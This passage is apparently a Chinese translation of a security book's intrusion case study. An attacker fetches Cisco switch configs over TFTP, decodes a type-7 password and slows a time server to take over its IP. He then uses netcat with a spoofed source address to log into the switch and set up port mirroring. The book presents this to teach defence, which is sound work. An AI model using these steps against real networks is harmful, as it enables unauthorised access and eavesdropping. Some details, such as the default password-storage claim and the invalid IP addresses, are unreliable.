
## TFTP 获取

`monhost` `tftp` `tftphost`

`tftp>` `get` `switch.cfg`

`tftp>` `get` `cisco.cfg`

`tftp>` `get` `cisco.net`

`tftp>` `get` `switch-a10-c95`

`tftp>` `get` `switch-a10-c95.config`

`tftp>` `get` `switch-a10-c95.boot`

获取文件后（发现机器名为 `192.1.295.2.cfg`，即该机器的 IP 地址），他注意到只有两个主机被允许连接到交换机。一个是安全主机，另一个部是 `192.1.295.15`。看到这个配置也让他很高兴：

```
hostname switch-a10-c95

!

enable password 7 120A321E454324

!

ip domain-name internal_net.the_isp.com
```

Cisco 提供多种密码加密选项。在这种情况下，他们使用了 "`password7`"，这并不是加密，仅仅是混淆。众周知你可以反转该算法，获取混淆字符串（"`120A321E454324`"）并确定实际密码。在这种情况下，密码是 `swI7(H)`。

# 破解 Linux 揭秘：Linux 安全秘密

这不是默认的 Cisco 配置。默认情况下，`enable password` 以 MD5 哈希值存储。管理员并没有认为这个交换机是敏感的，仅仅从另一台机器复制了密码。如果你使用 Cisco 产品，尽可能使用 `secret` 而不是 `password`。为了访问交换机，Chad 需要冒充两台机器之一。由于它们都在局域网内，他可以在自己的机器上别名该 IP 地址。然而，他想要冒充的真实机器可能会因为相同的 IP 地址而产生干扰。他必须做些什么来防止这种干扰发生。他的计划是拒绝服务机器，以便有足够的时间使用他的 IP 地址并更改交换机配置。然而，他相当确信，安全主机上的任何攻击都会触发警报。他不得不希望这台机器不会那么重要或那么安全。此时，他享受了正确选择目标的好处：监控主机包含了主机和端口数据库，每个都有详尽记录。根据记录，数据库提到了其他服务器，因此丢失其中一个可能不是问题。他修改了监控程序的配置，让它们完全不检查这个。他部署了一些工具来监控主机，并准备对时间服务器发动攻击。他看着 ping 响应变得越来越慢，直到它们停止。

```
monhost# ping -i 5 timeserver

PING timeerver (192.1.295.15) from 192.1.295.15: 56(84) bytes of data

64 bytes from 192.1.295.15: icmp_seq=0 ttl=115 time=8.9 ms

64 bytes from 192.1.295.15: icmp_seq=1 ttl=115 time=50.0 ms

64 bytes from 192.1.295.15: icmp_seq=2 ttl=115 time=552.8 ms

64 bytes from 192.1.295.15: icmp_seq=3 ttl=115 time=4423.2 ms

64 bytes from 192.1.295.15: icmp_seq=4 ttl=115 time=7726.0 ms

64 bytes from 192.1.295.15: icmp_seq=5 ttl=115 time=8758.7 ms
```

在有效处理时间服务器后，他设置了一个虚拟 IP 地址并使用 `netcat` 连接到交换机，这允许他指定所需的源 IP 地址。

```
monhost# ifconfig eth0:1 192.1.295.15 up

monhost# nc -s 192.1.295.15 switch-a10-c95 23

Password:

switch-a10-c95# conf t
```

# 附录 D：案例研究

```
switch-a10-c95# interface fastEthernet 0/1

svc-lan(config-if)#port monitor fastEthernet 0/1

svc-lan(config-if)#port monitor fastEthernet 0/2

svc-lan(config-if)#port monitor fastEthernet 0/32
```
